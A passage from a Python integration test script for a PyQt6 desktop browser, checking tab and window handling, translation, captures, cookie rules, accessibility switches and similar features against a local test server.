      bool(getattr(B.capture, "_redacting", False)))


# ===== ninth pass lows: daily log, dates, bar words, time zones ==========
if br.desk() is not None:
    _dk128 = br.desk()
    _tp128 = _dk128.todo_path()
    _was128 = _tp128.read_text() if _tp128.exists() else None
    _done128 = json.dumps(br.config.get("todosDoneOn") or {})
    _tp128.write_text("- [ ] tick128\n")
    _tid128 = _dk128.todos()[0]["id"]
    br.desk_do("toggleTodo", json.dumps({"id": _tid128}))
    # ticked, unticked and ticked again is one to-do done, not two
    br.desk_do("toggleTodo", json.dumps({"id": _tid128}))
    br.desk_do("toggleTodo", json.dumps({"id": _tid128}))
    _log128 = br.daily_log()
    if _was128 is None:
        _tp128.unlink()
    else:
        _tp128.write_text(_was128)
    br.config["todosDoneOn"] = json.loads(_done128)
    check("the daily log counts a to-do ticked off today",
          int((_log128 or {}).get("todos") or 0) == 1, str(_log128))
check("an impossible date makes no calendar entry",
      br.ics_from_text("Meeting 2026-13-45 19:00") == "")
check("'each' and 'beach' in the bar are words, not hex numbers",
      B.bar_answer("each") is None and B.bar_answer("beach") is None)
check("EST is five hours behind UTC all year",
      B._zone_for("est") == "Etc/GMT+5", str(B._zone_for("est")))

# ===== ninth pass, part 3: marks per window, bar hints, captures, misc ====
# N23 the rate-table hint row opens Settings instead of emptying the clipboard
_mr129 = dict(B.MONEY_RATES)
B.MONEY_RATES["rates"] = {}
try:
    _rows129 = br._own_suggestions("20 usd in eur")
    _act129 = dict(getattr(br, "_suggest_actions", None) or {})
finally:
    B.MONEY_RATES.clear()
    B.MONEY_RATES.update(_mr129)
_hint129 = [a for r, a in _act129.items() if "rate table" in r]
check("the 'switch the rate table on' row opens Settings, it does not copy ''",
      bool(_hint129) and _hint129[0][0] == "settings", str(_hint129))
# N24 the preposition is not an inch, a place is not a stone
_ma129 = B._metric_answer
check("'3 in the book' and '1st place' are not measurements; '5 in long' is",
      _ma129("Chapter 3 in the book") is None
      and _ma129("we finished 1st today") is None
      and (_ma129("it is 5 in long") or ("", ""))[1] == "127"
      and _ma129("a 27 in monitor") is not None
      and _ma129("2 lb of it") is not None,
      str((_ma129("Chapter 3 in the book"), _ma129("we finished 1st today"),
           _ma129("it is 5 in long"))))
# N33 a subtitle file's language comes from its name, never "de" by default
_sl129 = getattr(B, "_subtitle_lang", None)
_addsubs129 = str(getattr(B, "MEDIA_TOOLS2", {}).get("addsubs", ""))
check("a subtitle file is tagged with the language its name gives, or none",
      _sl129 is not None and _sl129("film.en.srt") == "en"
      and _sl129("Film_eng.forced.vtt") == "en" and _sl129("film.srt") == ""
      and _sl129("film.2024.srt") == ""
      and 'want.lang || "de"' not in _addsubs129,
      str(_sl129 and [_sl129(n) for n in ("film.en.srt", "film.srt")]))
# N32 the Mac edition asks pip
_plat129 = sys.platform
try:
    sys.platform = "darwin"
    _cmd129 = br._lib_check_cmd()
    _up129 = br._lib_upgrade_cmd()
    _found129 = br._lib_found_updates(0, "PyQt6 6.0 6.1 wheel")
finally:
    sys.platform = _plat129
check("on a Mac the library check and upgrade are pip's, not dnf's",
      _cmd129[0] == sys.executable and _up129[0] == sys.executable
      and _found129 is True, str((_cmd129[0], _up129[0], _found129)))
# N27 the capture diff is quick and counts what moved
_d1_129 = B.QImage(800, 600, B.QImage.Format.Format_RGB32)
_d1_129.fill(B.QColor("#202020"))
_d2_129 = B.QImage(_d1_129)
_pt129 = B.QPainter(_d2_129)
_pt129.fillRect(100, 100, 50, 40, B.QColor("#ffffff"))
_pt129.end()
_t129 = _time.monotonic()
_pic129, _ch129 = B.capture.diff_images(_d1_129, _d2_129)
_dt129 = _time.monotonic() - _t129
check("the capture diff counts the pixels that moved, without holding the "
      "window", _ch129 == 50 * 40 and _dt129 < 3.0
      and _pic129.pixelColor(120, 120).name() == "#f38ba8"
      and _pic129.pixelColor(10, 10).name() == "#202020",
      str((_ch129, round(_dt129, 2))))
# N28 / N20 the downloads page says "Waiting"; a date-only countdown is local
_dlh129 = (_Path(B.__file__).parent / "downloads.html").read_text()
_seth129 = (_Path(B.__file__).parent / "settings.html").read_text()
check("a queued download reads 'Waiting', and a date-only countdown ends at "
      "local midnight", "e.queued" in _dlh129 and 'text += "T00:00"' in _seth129)
# N30 Refresh shows the refreshed list
_mcm129 = br.mc_menu()
_ref129 = [a for a in _mcm129.actions() if a.text() == br._ui_str("mcRefresh")]
br.__dict__.pop("_mc_shown", None)
if _ref129:
    _ref129[0].trigger()
    H.spin(200)
_shown129 = getattr(br, "_mc_shown", None)
check("the server menu's Refresh shows the refreshed list",
      _shown129 is not None, str(_shown129))
try:
    if _shown129 is not None:
        _shown129.close()
    _mcm129.deleteLater()
except RuntimeError:
    pass
# N31 the grid takes only names it can use, and counts what it made
_fl131 = []
_real_fl131 = br.flash
br.flash = lambda text, *a, **k: _fl131.append(str(text))
try:
    _none131 = br.multistream("ab, x")
    _v131 = br.multistream(["abcd", "efgh", "x", "ijkl", "mnop", "qrst"])
    if _v131 not in (None, False):
        H.wait_for(lambda: any(br._ui_str("gridMade") % 4 == f
                               for f in _fl131), 8000)
finally:
    br.flash = _real_fl131
check("a grid of unusable names is refused, and a grid of six names says 4",
      _none131 is False and (br._ui_str("gridMade") % 4) in _fl131
      and (br._ui_str("gridMade") % 6) not in _fl131, str(_fl131[-3:]))
try:
    if _v131 not in (None, False) and br.tabs.indexOf(_v131) >= 0:
        br.close_tab(br.tabs.indexOf(_v131), ask=False)
except RuntimeError:
    pass
# N6 the Discord shot writes the bytes that fit
_real_fit129 = B.capture.fit_under
B.capture.fit_under = lambda image, limit, fmt="jpeg": (
    b"\xff\xd8\xff\xe0fit129", image)
_sh129 = json.dumps(br.config.get("shotHistory") or [])
_dv129 = br.new_tab(url=srv.url("/twhome")); H.spin(300)
H.wait_for(lambda: "twhome" in _dv129.url().toString(), 6000)
br.tabs.setCurrentWidget(_dv129); H.spin(300)
try:
    _dp129 = br.shot_for_discord(view=_dv129)
finally:
    B.capture.fit_under = _real_fit129
_dbytes129 = b""
try:
    _dbytes129 = _Path(str(_dp129)).read_bytes() if _dp129 else b""
except OSError:
    pass
_dlisted129 = str(_dp129) in (br.config.get("shotHistory") or [])
check("the Discord shot is the file that fits the limit, and is listed",
      _dbytes129 == b"\xff\xd8\xff\xe0fit129" and _dlisted129,
      str((_dbytes129[:12], _dlisted129)))
try:
    if _dp129:
        _Path(str(_dp129)).unlink()
except OSError:
    pass
br.config["shotHistory"] = json.loads(_sh129)
# N26 a tab captured in the background stays where it was, as it was
_bx129 = br.new_tab(url=srv.url("/twhome?bg=1"), switch=False); H.spin(200)
_by129 = br.new_tab(url=srv.url("/twhome?bg=2"), switch=False); H.spin(200)
H.wait_for(lambda: all("twhome" in w.url().toString()
                       for w in (_bx129, _by129)), 6000)
br.tabs.setCurrentWidget(_dv129); H.spin(300)
br.tabs.setCurrentWidget(_by129); H.spin(300)
br.tabs.setCurrentWidget(_dv129); H.spin(300)
_at129 = br.tabs.indexOf(_bx129)
_txt129 = br.tabs.tabText(_at129)
_before129 = getattr(br, "_tab_before", None)
_sp129 = None
try:
    _sp129 = br.shot_background_tab(view=_bx129)
except Exception as _e129:
    _sp129 = repr(_e129)
H.spin(200)
check("a tab captured in the background keeps its place, its name and the "
      "'tab before'", br.tabs.indexOf(_bx129) == _at129
      and br.tabs.tabText(br.tabs.indexOf(_bx129)) == _txt129
      and br.current() is _dv129
      and getattr(br, "_tab_before", None) is _before129,
      str((_at129, br.tabs.indexOf(_bx129), _txt129, _sp129)))
try:
    if _sp129 and isinstance(_sp129, (str, _Path)) and _Path(str(_sp129)).is_file():
        _Path(str(_sp129)).unlink()
except OSError:
    pass
br.config["shotHistory"] = json.loads(_sh129)
for _w129 in (_bx129, _by129):
    try:
        if br.tabs.indexOf(_w129) >= 0:
            br.close_tab(br.tabs.indexOf(_w129), ask=False)
    except RuntimeError:
        pass
# N35 printing the article with the reader already on prints the article
_dl_was129 = br.config.get("downloadDir", "__absent__")
_pd129 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
br.config["downloadDir"] = str(_pd129)
H.load(_dv129, srv.url("/art96"))
H.wait_for(lambda: jsq(_dv129, "document.readyState === 'complete' && "
                       "document.body.innerText.length > 300"), 9000)
br.reader_mode(_dv129)
H.wait_for(lambda: jsq(_dv129, "!!document.getElementById('__readercss')",
                       B.MAIN_WORLD_ID), 5000)
_fl135 = []
br.flash = lambda text, *a, **k: _fl135.append(str(text))
try:
    _pp135 = br.print_reader(view=_dv129)
    _early135 = list(_fl135)
    H.wait_for(lambda: _pp135 and _Path(str(_pp135)).is_file()
               and _fl135, 12000)
finally:
    br.flash = _real_fl131
_still135 = jsq(_dv129, "!!document.getElementById('__readercss')",
                B.MAIN_WORLD_ID)
check("printing the article with the reader on keeps the reader, and says "
      "'written' only once the PDF is there",
      bool(_pp135) and _Path(str(_pp135)).is_file() and _still135 is True
      and not any(str(_Path(str(_pp135)).name) in f for f in _early135),
      str((_still135, _early135[:2], _fl135[-1:])))
if _dl_was129 == "__absent__":
    br.config.pop("downloadDir", None)
else:
    br.config["downloadDir"] = _dl_was129
try:
    if br.tabs.indexOf(_dv129) >= 0:
        br.close_tab(br.tabs.indexOf(_dv129), ask=False)
except RuntimeError:
    pass
# N16 a private window's mark is that window's, and survives a repaint
_pt_was129 = br.config.get("privateTint", "__absent__")
br.config["privateTint"] = "#123457"
_pw129 = br.new_private_window(); H.spin(800)
_app_has129 = "#123457" in app.styleSheet()
_pw_has129 = "#123457" in _pw129.styleSheet()
_br_has129 = "#123457" in br.styleSheet()
br.apply_chrome_style(); H.spin(200)
_pw_kept129 = "#123457" in _pw129.styleSheet()
_app_after129 = "#123457" in app.styleSheet()
check("a private window's mark is on that window alone, and a repaint from "
      "a normal window leaves it", not _app_has129 and _pw_has129
      and not _br_has129 and _pw_kept129 and not _app_after129,
      str((_app_has129, _pw_has129, _br_has129, _pw_kept129, _app_after129)))
try:
    _pw129._closing_anyway = True
    _pw129.close()
except RuntimeError:
    pass
H.spin(400)
if _pt_was129 == "__absent__":
    br.config.pop("privateTint", None)
else:
    br.config["privateTint"] = _pt_was129
br.apply_chrome_style()

# ===== review leftovers: translation bars, cache switch, volume boost ======
_tr_was130 = dict(br.translate_rules())
_ta130 = br.new_tab(url=srv.url("/twhome?tr=a"), switch=False); H.spin(200)
_tb130 = br.new_tab(url=srv.url("/twhome?tr=b"), switch=False); H.spin(200)
H.wait_for(lambda: all("twhome" in w.url().toString() and
                       jsq(w, "document.readyState") == "complete"
                       for w in (_ta130, _tb130)), 8000)
br.offer_translation_bar("fr", view=_ta130)
br.offer_translation_bar("es", view=_tb130)
H.wait_for(lambda: all(jsq(w, "!!document.getElementById('__trbar')",
                           B.APP_WORLD_ID) for w in (_ta130, _tb130)), 5000)
# what a trusted press on "never" leaves behind, in the bar's own world
H.js(_ta130, "window.__trAnswer = 'never'", B.APP_WORLD_ID)
H.js(_tb130, "window.__trAnswer = 'never'", B.APP_WORLD_ID)
H.wait_for(lambda: br.translate_rules().get("fr") == "never"
           and br.translate_rules().get("es") == "never", 4000)
_rules130 = dict(br.translate_rules())
br.offer_translation_bar("it", view=_ta130); H.spin(300)
H.load(_ta130, srv.url("/twhome?tr=c"))
_tm130 = getattr(br, "_trbar_timer", None)
H.wait_for(lambda: _tm130 is not None and not _tm130.isActive(), 4000)
check("each tab's translation bar is read, and the polling stops once the "
      "bars are answered or gone",
      _rules130.get("fr") == "never" and _rules130.get("es") == "never"
      and _tm130 is not None and not _tm130.isActive(),
      str((_rules130, _tm130 is not None and _tm130.isActive())))
br.config["translateRules"] = _tr_was130
for _w130 in (_ta130, _tb130):
    try:
        if br.tabs.indexOf(_w130) >= 0:
            br.close_tab(br.tabs.indexOf(_w130), ask=False)
    except RuntimeError:
        pass
# the cache switch in a private tab comes back on
_pc130 = br.new_tab(url=srv.url("/twhome?cache"), private=True,
                    switch=False); H.spin(300)
_kinds130 = B.QWebEngineProfile.HttpCacheType
br.cache_off(view=_pc130, on=True)
_off130 = _pc130.page().profile().httpCacheType()
br.cache_off(view=_pc130, on=False)
_on130 = _pc130.page().profile().httpCacheType()
check("switching the cache back on in a private tab really turns it on",
      _off130 == _kinds130.NoCache and _on130 == _kinds130.MemoryHttpCache,
      str((_off130, _on130)))
try:
    if br.tabs.indexOf(_pc130) >= 0:
        br.close_tab(br.tabs.indexOf(_pc130), ask=False)
except RuntimeError:
    pass
# the volume boost never routes a cross-origin player into silence
_vb130 = br.new_tab(url=srv.url("/twhome?boost"), switch=False); H.spin(200)
H.wait_for(lambda: jsq(_vb130, "document.readyState") == "complete", 6000)
H.js(_vb130, "var a = document.createElement('audio');"
             "a.src = 'http://localhost:' + location.port + '/a130.mp3';"
             "document.body.appendChild(a); 1")
_bg130 = []
br.media_tool("boost", view=_vb130, then=_bg130.append, factor=2.0)
H.wait_for(lambda: _bg130, 4000)
_ctx130 = jsq(_vb130, "!!window.__boostCtx", B.APP_WORLD_ID)
check("the volume boost leaves a player from another site at plain volume",
      _bg130 and _bg130[0] is not None and _bg130[0] <= 1
      and _ctx130 is False, str((_bg130, _ctx130)))
try:
    if br.tabs.indexOf(_vb130) >= 0:
        br.close_tab(br.tabs.indexOf(_vb130), ask=False)
except RuntimeError:
    pass
# a self-signed certificate is described in the panel, not left blank
import ssl as _ssl130, socket as _sock130, threading as _thr130
import subprocess as _subp130   # "_sp" is a tab in an earlier section
_cd130 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_subp130.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", str(_cd130 / "k.pem"), "-out", str(_cd130 / "c.pem"),
         "-days", "2", "-subj", "/CN=review130.test/O=Review"],
        capture_output=True, timeout=60)
_info130 = {}
if (_cd130 / "c.pem").is_file():
    _ctx130s = _ssl130.SSLContext(_ssl130.PROTOCOL_TLS_SERVER)
    _ctx130s.load_cert_chain(str(_cd130 / "c.pem"), str(_cd130 / "k.pem"))
    _ls130 = _sock130.socket()
    _ls130.bind(("127.0.0.1", 0)); _ls130.listen(4)
    _ls130.settimeout(15)
    def _serve130():
        for _n in range(2):
            try:
                c, _a = _ls130.accept()
            except OSError:
                return
            try:
                _ctx130s.wrap_socket(c, server_side=True).close()
            except (OSError, _ssl130.SSLError):
                c.close()
    _thr130.Thread(target=_serve130, daemon=True).start()
    _info130 = br.certificate_for("127.0.0.1", port=_ls130.getsockname()[1])
    _ls130.close()
check("a self-signed certificate shows its name, issuer and dates",
      _info130.get("subject") == "review130.test"
      and _info130.get("verified") is False and _info130.get("until"),
      str({k: _info130.get(k) for k in ("subject", "issuer", "until",
                                        "verified", "error")}))

# ===== tenth pass: windows -- moves, gathering, closing, the timers ========
# T17 a tab moved to its own window is not "recently closed"
_mv132 = br.new_tab(url=srv.url("/twhome?mv132"), switch=False); H.spin(300)
H.wait_for(lambda: "mv132" in _mv132.url().toString(), 6000)
_w132 = br.move_tab_to_window(br.tabs.indexOf(_mv132)); H.spin(600)
_closed132 = [r.get("url", "") for r in getattr(br, "_closed_tabs", [])]
check("a tab moved to another window is not on the recently-closed list",
      not any("mv132" in u for u in _closed132), str(_closed132[-2:]))
try:
    if _w132 is not None:
        _w132._closing_anyway = True
        _w132.close()
except RuntimeError:
    pass
H.spin(300)
# T16 / T21 a group moved to a window: its colour, loaded, no spare tab
_g132 = br.ensure_group("rv132grp", colour="#ff0000")
_ga132 = br.new_tab(url=srv.url("/twhome?ga132"), switch=False,
                    group=_g132); H.spin(300)
_gb132 = br.new_tab(url=srv.url("/twhome?gb132"), switch=False,
                    group=_g132); H.spin(300)
H.wait_for(lambda: all("132" in w.url().toString() for w in (_ga132, _gb132)),
           6000)
_gw132 = br.move_group_to_window(_g132); H.spin(900)
_grows132 = [w for _i, w in _gw132._real_tabs()] if _gw132 else []
check("a group moved to a window keeps its colour, loads, and brings no "
      "blank start tab", _gw132 is not None
      and _gw132.group_colors.get("rv132grp") == "#ff0000"
      and len(_grows132) == 2
      and not any(getattr(w, "_pending", None) for w in _grows132),
      str((_gw132 and _gw132.group_colors.get("rv132grp"), len(_grows132),
           [getattr(w, "_pending", None) for w in _grows132])))
try:
    if _gw132 is not None:
        for w in _grows132:
            w.locked = False
        _gw132._closing_anyway = True
        _gw132.close()
except RuntimeError:
    pass
H.spin(300)
# T27 a window closed with a tab popped out is remembered with that tab
_pw132 = br.new_window(url=srv.url("/twhome?keep132")); H.spin(900)
_pt132 = _pw132.new_tab(url=srv.url("/twhome?pop132")); H.spin(300)
H.wait_for(lambda: "pop132" in _pt132.url().toString(), 6000)
_mini132 = _pw132.pop_out_tab(_pw132.tabs.indexOf(_pt132)); H.spin(300)
_pw132._closing_anyway = True
_pw132.close(); H.spin(500)
_last132 = (B.CLOSED_WINDOWS[-1].get("tabs") if B.CLOSED_WINDOWS else []) or []
check("a window closed with a popped-out tab can come back with that tab",
      any("pop132" in str(e.get("u", "")) for e in _last132),
      str([e.get("u", "")[-14:] for e in _last132]))
# T0 a window that owned the desk timer hands it over when it closes
_dw132 = br.new_window(url=srv.url("/twhome?desk132")); H.spin(900)
_dw132._desk_timer.start()
_dw132._closing_anyway = True
_dw132.close(); H.spin(400)
_desk_left132 = _dw132._desk_timer.isActive()
_sn_was132 = json.dumps(br.config.get("snoozed") or [])
br.config["snoozed"] = [{"url": srv.url("/twhome?snz132"), "at": 1}]
_woke132 = 0
try:
    _woke132 = _dw132.wake_snoozed()
except RuntimeError:
    _woke132 = -1
H.spin(400)
def _snz_tabs132():
    out = []
    for win in br.windows():
        try:
            for _i, w in win._real_tabs():
                if "snz132" in (getattr(w, "_pending", "") or
                                w.url().toString()):
                    out.append((win, w))
        except RuntimeError:
            continue
    return out
_snz_here132 = bool(_snz_tabs132())
check("a closed window stops its desk timer, and a snoozed tab wakes in a "
      "window that is open", not _desk_left132 and _woke132 == 1
      and _snz_here132, str((_desk_left132, _woke132, _snz_here132)))
for _win132, _w in _snz_tabs132():
    try:
        _win132.close_tab(_win132.tabs.indexOf(_w), ask=False)
    except RuntimeError:
        pass
br.config["snoozed"] = json.loads(_sn_was132)
# T1 a private window gathers nothing, and gathering leaves private ones
_pv132 = br.new_private_window(); H.spin(800)
_pvt132 = _pv132.current()
_got_p132 = _pv132.merge_windows()
_alive132 = br in br.windows()
_got_n132 = br.merge_windows(); H.spin(600)
_pv_open132 = _pv132 in br.windows()
check("a private window gathers no windows, and gathering into an ordinary "
      "one leaves the private window open", _got_p132 == 0 and _alive132
      and _pv_open132, str((_got_p132, _alive132, _pv_open132)))
try:
    _pv132._closing_anyway = True
    _pv132.close()
except RuntimeError:
    pass
H.spin(400)
# T5 / T19 the command line hands a "cmd" over, and an --app on the retry
_main_src132 = __import__("inspect").getsource(B.main)
check("'browser cmd <name>' is sent as a command, and the second hand-off "
      "keeps --app", 'words[0] == "cmd"' in _main_src132
      and _main_src132.count("app=app_url") >= 2)

# ===== tenth pass: a11y, groups, stale tabs ================================
# T2 the hover picture and the text-zoom sheet are two elements
check("the hover zoom picture has an id of its own, apart from the text zoom",
      'getElementById("__a11yhover")' in B.A11Y_JS
      and B.A11Y_JS.count('getElementById("__a11yzoom")') == 2,
      str(B.A11Y_JS.count('getElementById("__a11yzoom")')))
# T3 mono reaches a page loaded after the switch was flipped
_mono_was133 = br.a11y_config().get("monoAudio")
br.set_a11y("monoAudio", True)
_au133 = br.new_tab(url=srv.url("/twhome?mono133"), switch=False); H.spin(300)
H.wait_for(lambda: jsq(_au133, "!!window.__audioShape", B.MAIN_WORLD_ID), 6000)
_shape133 = jsq(_au133, "window.__audioShape ? window.__audioShape.mono : null",
                B.MAIN_WORLD_ID)
br.set_a11y("monoAudio", bool(_mono_was133))
check("mono sound reaches a page opened after it was switched on",
      _shape133 is True, str(_shape133))
try:
    if br.tabs.indexOf(_au133) >= 0:
        br.close_tab(br.tabs.indexOf(_au133), ask=False)
except RuntimeError:
    pass
# T4 a private tab's menus offer no "only on this site"
_pa133 = br.new_tab(url=srv.url("/twhome?pa133"), private=True,
                    switch=False); H.spin(300)
H.wait_for(lambda: "pa133" in _pa133.url().toString(), 6000)
def _menu_texts133(m):
    out = []
    for a in m.actions():
        out.append(a.text())
        if a.menu() is not None:
            out.extend(_menu_texts133(a.menu()))
    return out
_site133 = br._ui_str("a11ySiteOnly") % "127.0.0.1"
_txt133 = _menu_texts133(br.a11y_menu(view=_pa133))
check("a private tab's accessibility menu offers no per-site profile",
      _site133 not in _txt133, str([t for t in _txt133 if "127" in t][:3]))
try:
    if br.tabs.indexOf(_pa133) >= 0:
        br.close_tab(br.tabs.indexOf(_pa133), ask=False)
except RuntimeError:
    pass
# T6 a group rule leaves another virtual browser's group of that name alone
_sess_was133 = list(br.sessions)
if not any(e.get("sid") == "rv133" for e in br.sessions):
    br.sessions.append({"name": "Review 133", "sid": "rv133"})
br.ensure_group("Mods133", session="rv133")
_rules_was133 = br.config.get("groupRules", "__absent__")
br.config["groupRules"] = [{"group": "Mods133", "match": "127.0.0.1"}]
try:
    _gt133 = br.new_tab(url=srv.url("/twhome?g133"), switch=False)
finally:
    if _rules_was133 == "__absent__":
        br.config.pop("groupRules", None)
    else:
        br.config["groupRules"] = _rules_was133
H.spin(300)
_gs133 = (getattr(_gt133, "session", None), getattr(_gt133, "group", None))
check("a group rule never puts a tab into another browser's group",
      _gs133[0] == br.active_session and _gs133[1] != "Mods133", str(_gs133))
try:
    if br.tabs.indexOf(_gt133) >= 0:
        br.close_tab(br.tabs.indexOf(_gt133), ask=False)
    if "Mods133" in br.groups:
        br.delete_group("Mods133")
except RuntimeError:
    pass
br.sessions[:] = _sess_was133
# T7 leaving a tab counts as looking at it; T8 it is saved with the session
_sa133 = br.new_tab(url=srv.url("/twhome?sa133")); H.spin(300)
_sb133 = br.new_tab(url=srv.url("/twhome?sb133"), switch=False); H.spin(300)
H.wait_for(lambda: all("133" in w.url().toString() for w in (_sa133, _sb133)),
           6000)
br.tabs.setCurrentWidget(_sa133); H.spin(200)
_sa133._seen_wall = 1.0
br.tabs.setCurrentWidget(_sb133); H.spin(200)
_left133 = getattr(_sa133, "_seen_wall", 0)
_sb133._seen_wall = 1234567.0
br.tabs.setCurrentWidget(_sa133); H.spin(200)
_sb133._seen_wall = 1234567.0
br._save_groups(quiet=True)
_rows133 = [r for rows in (br.config.get("sessionTabs") or {}).values()
            for r in rows if isinstance(r, dict) and "sb133" in r.get("u", "")]
check("a tab just left counts as looked at, and when is kept with the session",
      _left133 > _time.time() - 60 and _rows133
      and _rows133[0].get("w") == 1234567, str((_left133, _rows133[:1])))
for _w133 in (_sa133, _sb133):
    try:
        if br.tabs.indexOf(_w133) >= 0:
            br.close_tab(br.tabs.indexOf(_w133), ask=False)
    except RuntimeError:
        pass

# ===== tenth pass: macro stop, cookie rules, text tools, translation ======
# T9 a stop works on the recording it was asked about
_absrc134 = (_Path(B.__file__).parent / "agent_bridge.py").read_text()
check("a macro stop takes its own recording and clears the slot at once",
      "macro = self.macro\n            self.macro = None" in _absrc134
      and 'self.macro["steps"] = steps' not in _absrc134)
# T12 the most specific cookie rule decides, as the menu shows
_cr_was134 = json.dumps(br.cookie_rules())
br.cookie_rule("rv134.example", "close")
br.cookie_rule("sub.rv134.example", "block")
br.cookie_rule("rv134b.example", "block")
br.cookie_rule("a.rv134b.example", "allow")
_r134 = (br.cookie_rule_for("sub.rv134.example"),
         br.cookie_rule_for(".x.sub.rv134.example"),
         br.cookie_rule_for("other.rv134.example"),
         br.cookie_rule_for("a.rv134b.example"),
         br.cookie_rule_for("b.rv134b.example"))
_rules134 = br.cookie_rules()
_rules134.clear()
_rules134.update(json.loads(_cr_was134))
br.save_config(quiet=True)
check("the closest cookie rule wins, and 'allow' under a blocked parent holds",
      _r134 == ("block", "block", "close", "allow", "block"), str(_r134))
# T14 Title Case with an apostrophe and an umlaut
_tc134 = br.new_tab(url=srv.url("/twhome?tc134")); H.spin(300)
H.wait_for(lambda: jsq(_tc134, "document.readyState") == "complete", 6000)
H.js(_tc134, "var i = document.createElement('input'); i.id = 'tc134';"
             "i.value = \"it's über uns\"; document.body.appendChild(i);"
             "i.focus(); i.select(); 1")
_tcd134 = []
br.desk_tool("textcase", view=_tc134, then=_tcd134.append, arg="title")
H.wait_for(lambda: _tcd134, 4000)
_tcv134 = jsq(_tc134, "document.getElementById('tc134').value")
check("Title Case leaves the letter after an apostrophe alone and knows ü",
      _tcv134 == "It's Über Uns", str(_tcv134))
# T15 the translation keeps links for Undo, and a list's inner list
H.js(_tc134, "document.body.innerHTML = '<p id=p134>Read the <a href=\"/x\">"
             "full article</a> here please</p><ul><li id=li134>Outer item "
             "words<ul><li>Inner item words</li></ul></li></ul>'; 1")
_real_rt134 = br.run_translator
_real_ct134 = br.caption_tools
br.run_translator = lambda text, then=None, lang="de", limit=0: (
    then and then("T:" + text))
# a translator on this machine, as far as the browser can tell: without
# one, translating in place does nothing at all
br.caption_tools = lambda: {"captionTranslator": "/bin/true"}
try:
    br.translate_in_place(view=_tc134, lang="de")
    H.wait_for(lambda: jsq(_tc134, "document.querySelectorAll('[data-was]')"
                                   ".length") == 3, 6000)
    _inner134 = jsq(_tc134, "document.querySelectorAll('#li134 ul li').length")
    _own134 = jsq(_tc134, "document.getElementById('li134').firstChild"
                          ".nodeValue")
    br.undo_translation(view=_tc134)
    H.wait_for(lambda: jsq(_tc134, "document.querySelectorAll('[data-was]')"
                                   ".length") == 0, 4000)
finally:
    br.run_translator = _real_rt134
    br.caption_tools = _real_ct134
    br.__dict__.pop("caption_tools", None)
    br.__dict__.pop("run_translator", None)
_link134 = jsq(_tc134, "!!document.querySelector('#p134 a[href=\"/x\"]')")
check("translating keeps a list's inner list (its own words translated), "
      "and Undo brings the links back",
      _inner134 == 1 and str(_own134).startswith("T:Outer item words")
      and _link134 is True, str((_inner134, _own134, _link134)))
try:
    if br.tabs.indexOf(_tc134) >= 0:
        br.close_tab(br.tabs.indexOf(_tc134), ask=False)
except RuntimeError:
    pass
# T11 a dragged rail width is written back
check("the rail's dragged width is written back when the drag settles",
      hasattr(br, "_rail_drag") and hasattr(br, "_sidebar_dragged"))

# ===== tenth pass: feeds, lite mode, sleeping, panels, clipboard, modes ===
# T20 an Atom entry links to its article
check("a feed entry links to its rel=alternate article, not the first link",
      'item.querySelector("link[rel=alternate]")'
      in _Path(B.__file__).read_text())
# T22 lite mode off gives his image block back
from PyQt6.QtWebEngineCore import QWebEngineSettings as _QWS135
_ni_was135 = br.config.get("noImageSites", "__absent__")
_lite_was135 = bool(br.config.get("liteMode", False))
br.config["noImageSites"] = ["127.0.0.1"]
_li135 = br.new_tab(url=srv.url("/twhome?lite135"), switch=False); H.spin(300)
H.wait_for(lambda: "lite135" in _li135.url().toString(), 6000)
br.apply_site_privacy(_li135)
br.lite_mode(True)
br.lite_mode(False)
_img135 = _li135.page().settings().testAttribute(
    _QWS135.WebAttribute.AutoLoadImages)
if _ni_was135 == "__absent__":
    br.config.pop("noImageSites", None)
else:
    br.config["noImageSites"] = _ni_was135
if _lite_was135:
    br.lite_mode(True)
check("lite mode switched off leaves images off on a site he blocks them on",
      _img135 is False, str(_img135))
# T23 a tab using the camera is not put to sleep
_ml_was135 = list(getattr(br, "_media_live", None) or [])
br._media_live = _ml_was135 + [{"view": _li135, "kind": "camera"}]
try:
    _slept135 = br.sleep_tab(_li135)
finally:
    br._media_live = _ml_was135
if _slept135:
    br.sleep_tab(_li135, on=False)
check("a background tab using the camera is never put to sleep",
      _slept135 is False, str(_slept135))
try:
    if br.tabs.indexOf(_li135) >= 0:
        br.close_tab(br.tabs.indexOf(_li135), ask=False)
except RuntimeError:
    pass
# T24 the panel is measured in the page splitter
check("the side panel is sized in the page splitter, not the whole window",
      hasattr(br, "_split_width") and 0 < br._split_width() <= br.width())
# T25 a second secret's timer is its own
_cc_was135 = br.config.get("clipClear", "__absent__")
_QGA.clipboard().setText("secret-one-135")
br.clear_clipboard_later(1)
H.spin(400)
_QGA.clipboard().setText("secret-two-135")
br.clear_clipboard_later(2)
H.spin(900)
_still135 = _QGA.clipboard().text()
H.wait_for(lambda: _QGA.clipboard().text() == "", 3000)
_gone135 = _QGA.clipboard().text()
check("each copied secret is cleared by its own timer, not the one before",
      _still135 == "secret-two-135" and _gone135 == "",
      str((_still135, _gone135)))
# E30 a mode brings the side panel back with its site
_modes_was135 = json.dumps(br.modes())
_mode_now135 = br.mode_now()
br.open_panel(srv.url("/twhome?panel135")); H.spin(400)
H.wait_for(lambda: "panel135" in br._panel_view.url().toString(), 6000)
br.save_mode("rv135")
br.toggle_panel(False); H.spin(200)
br.open_mode("rv135"); H.spin(400)
H.wait_for(lambda: "panel135" in br._panel_view.url().toString(), 6000)
_pon135 = bool(getattr(br, "_panel", None) is not None and br._panel.isVisible())
_purl135 = br._panel_view.url().toString() if _pon135 else ""
br.toggle_panel(False)
br.config["modes"] = json.loads(_modes_was135)
br.config["modeNow"] = _mode_now135
check("a mode saved with the side panel open opens it again, on its site",
      _pon135 and "panel135" in _purl135, str((_pon135, _purl135)))

# ===== tenth pass: a11y switches undo, a site's storage cleared ===========
# T18 bold starts switched off take the marks off the page
_bs_was136 = bool(br.a11y_config().get("boldStarts"))
_bv136 = br.new_tab(url=srv.url("/art96?bold136")); H.spin(300)
H.wait_for(lambda: jsq(_bv136, "document.readyState") == "complete", 6000)
br.set_a11y("boldStarts", True)
H.wait_for(lambda: (jsq(_bv136, "document.querySelectorAll('span.__a11yb')"
                               ".length") or 0) > 0, 6000)
_on136 = jsq(_bv136, "document.querySelectorAll('span.__a11yb').length")
br.set_a11y("boldStarts", False)
H.wait_for(lambda: jsq(_bv136, "document.querySelectorAll('span.__a11yb')"
